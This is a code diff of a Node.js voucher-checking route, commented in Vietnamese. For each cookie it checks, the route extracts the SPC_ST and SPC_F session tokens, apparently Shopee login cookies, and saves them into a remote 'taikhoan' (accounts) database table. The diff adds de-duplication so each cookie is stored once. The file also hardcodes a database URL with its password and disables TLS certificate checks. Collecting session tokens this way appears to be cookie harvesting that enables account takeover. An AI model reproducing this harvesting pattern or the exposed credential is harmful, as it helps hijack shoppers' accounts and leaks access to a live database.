@@ -2,7 +2,7 @@ const https = require('https');
 const zlib = require('zlib');
 const { Pool } = require('pg');
 
-// --- Kết nối DB (giống script 2) ---
+// --- Kết nối DB ---
 const DATABASE_URL = process.env.DATABASE_URL || 'postgresql://cookiedb_3atl_user:swCFgz5aOeYG5B5kY8YSRxaREybOrMRP@dpg-d9selc2fngtc73f6ne1g-a.singapore-postgres.render.com/cookiedb_3atl';
 
 const pool = new Pool({
@@ -10,14 +10,12 @@ const pool = new Pool({
     ssl: { rejectUnauthorized: false }
 });
 
-// --- Helper: Parse SPC_ST từ chuỗi cookie ---
 function extractSpcSt(cookieStr) {
     if (!cookieStr) return null;
     const match = cookieStr.match(/SPC_ST=([^;]+)/);
     return match ? match[1] : null;
 }
 
-// --- Helper: Parse SPC_F từ chuỗi cookie ---
 function extractSpcF(cookieStr) {
     if (!cookieStr) return null;
     const match = cookieStr.match(/SPC_F=([^;]+)/);
@@ -118,6 +116,9 @@ async function handleVoucherRoutes(req, res) {
             const results = [];
             let requestCount = 0;
 
+            // --- Set để đảm bảo 1 cookie chỉ insert 1 lần ---
+            const insertedCookies = new Set();
+
             for (let i = 0; i < COOKIES.length; i++) {
                 for (let j = 0; j < VOUCHER_CODES.length; j++) {
                     requestCount++;
@@ -126,23 +127,25 @@ async function handleVoucherRoutes(req, res) {
                     if (result.success && result.data?.data) {
                         const invalidCode = result.data.data.invalid_message_code;
 
-                        // --- MỚI: Nếu prop data có value -> lưu SPC_ST vào DB ---
-                        try {
-                            const spcSt = extractSpcSt(COOKIES[i]);
-                            const spcF  = extractSpcF(COOKIES[i]);
-                            if (spcSt) {
-                                await pool.query(
-                                    `INSERT INTO taikhoan (phone, username, email, password, spc_f, spc_st)
-                                     VALUES ($1, $2, $3, $4, $5, $6)
-                                     ON CONFLICT (id) DO NOTHING`,
-                                    [null, null, null, null, spcF || null, spcSt]
-                                );
+                        // --- INSERT DB: chỉ chạy 1 lần cho mỗi cookie ---
+                        if (!insertedCookies.has(COOKIES[i])) {
+                            try {
+                                const spcSt = extractSpcSt(COOKIES[i]);
+                                const spcF  = extractSpcF(COOKIES[i]);
+                                if (spcSt) {
+                                    await pool.query(
+                                        `INSERT INTO taikhoan (phone, username, email, password, spc_f, spc_st)
+                                         VALUES ($1, $2, $3, $4, $5, $6)
+                                         ON CONFLICT (id) DO NOTHING`,
+                                        [null, null, null, null, spcF || null, spcSt]
+                                    );
+                                    insertedCookies.add(COOKIES[i]);
+                                }
+                            } catch (dbErr) {
+                                console.error('DB insert error:', dbErr.message);
                             }
-                        } catch (dbErr) {
-                            // Không throw, chỉ log để không làm gián đoạn flow chính
-                            console.error('DB insert error:', dbErr.message);
                         }
-                        // --- END MỚI ---
+                        // --- END INSERT DB ---
 
                         if (invalidCode === 0 || invalidCode === 1) {
                             results.push({
